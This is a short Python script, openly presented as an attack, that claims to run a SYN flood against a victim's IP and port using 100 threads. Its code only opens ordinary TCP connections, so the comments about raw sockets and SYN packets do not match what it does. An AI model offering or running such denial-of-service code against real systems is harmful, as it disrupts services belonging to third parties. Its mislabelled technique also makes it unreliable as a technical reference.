import socket
import random
import threading

# Attack parameters
TARGET_IP = "127.0.0.1"  # Replace with the victim's IP
TARGET_PORT = 80  # Replace with the target port (e.g., HTTP)
THREAD_COUNT = 100

def syn_flood():
    """Generates SYN packets to flood the target."""
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect((TARGET_IP, TARGET_PORT))
        sock.close()
    except:
        pass  # Ignore connection errors

# Launch multiple threads for the attack
for _ in range(THREAD_COUNT):
    thread = threading.Thread(target=syn_flood)
    thread.start()
